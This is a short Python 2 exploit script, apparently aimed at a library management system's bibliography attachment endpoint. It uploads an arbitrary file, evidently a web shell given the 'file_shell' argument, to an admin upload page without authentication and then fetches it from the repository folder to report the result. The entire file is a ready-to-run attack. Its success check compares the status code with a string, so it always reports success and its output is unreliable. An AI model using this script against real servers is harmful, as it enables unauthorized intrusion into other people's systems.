#!/usr/bin/python
# File Attachment Upload
# Coded By ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ

import sys, requests

print """
#######################################
# File Attachment Upload Exploiter   ##
# Coded By ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ   ##
#######################################
"""

target=sys.argv[1]
vuln="/admin/modules/bibliography/pop_attach.php?biblioID=0"
file_shell=sys.argv[2]
pyld={
"fileTitle" : "exploit",
"fileDir" : "",
"fileURL" : "",
"fileDesc" : "",
"accessType" : "public",
"upload" : 'Unggah Sekarang'
}
file_raw=open(file_shell,'r')
file_x={ "file2attach" : file_raw }

url_file=file_shell.split("/")
for akhir in url_file :
   continue

print "[*] Exploiting : " + target
print "[*] Uploading : " + akhir
exploit=requests.post(url=target + vuln, files=file_x, data=pyld)
cek=requests.get(url=target + "/repository/" + akhir)

if not cek.status_code == "200" :
    print "[+] Url Your File : " + target + "/repository/" + akhir
    print "[+] Exploit Status : Success"
else :
    print "[-] Exploit Status : Failed"
